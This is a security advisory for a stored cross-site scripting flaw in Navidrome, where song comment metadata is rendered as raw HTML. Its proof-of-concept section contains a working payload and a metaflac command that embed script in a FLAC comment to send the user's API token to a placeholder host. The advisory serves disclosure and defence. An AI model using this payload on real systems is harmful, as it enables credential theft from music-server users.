# [M] Navidrome has XSS via comment from song metadata

## Summary
Severity: Medium
Advisory: GHSA-rh3r-8pxm-hg4w
CVE: CVE-2026-25578
CWE: CWE-79, CWE-80
Ecosystem: Go
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-02-04
Source: https://github.com/advisories/GHSA-rh3r-8pxm-hg4w
Type: github-advisory

## Affected
- Go: `github.com/navidrome/navidrome` — affected >=0 <0.60.0

## Details
### Summary

An XSS vulnerability in the frontend allows a malicious attacker to inject code through the comment metadata of a song to exfiltrate user credentials.

An attacker's maliciously crafted song has to be added to Navidrome to exploit the vulnerability.

### Details

The frontend is using React. In various places, the code uses the `dangerouslySetInnerHTML` escape hatch to set the content of an HTML element.

In some places, the value is first sanitized by removing anything looking like an HTML tag. In at least one place the value is used as is, thus leading to the XSS vulnerability.

In `MultiLineTextField` component, the input is split into lines and rendered through the `dangerouslySetInnerHTML` property. 

```js
<div
  data-testid={`${source}.${idx}`}
  key={md5(line + idx)}
  dangerouslySetInnerHTML={{ __html: line }}
/>
```

This component is then used in the `SongInfo` and `AlbumInfo` components, when rendering the comment of the song or album. The contents of the comments field is taken verbatim from the metadata of a song, such as the VORBIS `COMMENT` comment of a FLAC file.

By crafting the contents of the comment field, an attacker can inject code into the frontend, which runs whenever a user views the song or album info.

Additionally, as the Navidrome API token is kept in local storage and since there's no CSP in place unless the user's configured one outside of Navidrome, the attacker can exfiltrate the API token.

### PoC

1. Modify the comment field of a song to contain the following payload using a tool like MusicBrain'z Picard:

```js
<img src=x onerror="fetch(`https://example.com/c2c/${localStorage.getItem('token')}`)" />
```

or use `metaflac`:

```shell
echo '<img src=x onerror="fetch(`https://example.com/c2c/${localStorage.getItem('token')}`)" />' | metaflac --set-tag=comment=<(cat) file.flac
```

2. Add the song to Navidrome
3. Enter the "Songs" or one of the albums page, click the "kebab menu" and then "Get Info"

In this payload, a broken image can be seen in the info dialog.

<img width="996" height="660" alt="image" src="https://github.com/user-attachments/assets/1467cdff-17b2-4dc6-9fb5-0a83c021ca04" />

In the developer tools' network inspector, the request exfiltrating the token to an example domain can be seen.

<img width="410" height="34" alt="image" src="https://github.com/user-attachments/assets/3f668797-63a6-4355-ae57-e95bde444143" />


### Impact

The vulnerability affects users of the Navidrome UI with songs from untrusted sources.

### Mitigations

- Users of Navidrome should configure a strict [[Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP) in their reverse-proxy to make exfiltration more difficult
- Users of Navidrome should not index songs from untrusted sources without first vetting their metadata

## References
- https://github.com/navidrome/navidrome/security/advisories/GHSA-rh3r-8pxm-hg4w
- https://nvd.nist.gov/vuln/detail/CVE-2026-25578
- https://github.com/navidrome/navidrome/commit/d7ec7355c9036d5be659d6ac555c334bb5848ba6
- https://github.com/navidrome/navidrome
- https://github.com/navidrome/navidrome/releases/tag/v0.60.0
